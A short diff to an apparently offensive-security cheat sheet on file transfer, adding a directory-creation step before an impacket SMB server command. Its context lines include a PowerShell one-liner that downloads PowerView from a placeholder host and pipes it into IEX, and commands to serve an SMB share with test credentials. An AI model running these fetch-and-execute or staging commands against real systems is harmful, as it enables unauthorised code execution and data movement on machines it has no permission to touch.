@@ -68,6 +68,7 @@ Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 
 ```bash
 # from linux
+mkdir /tmp/smbshare
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 # with creds
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
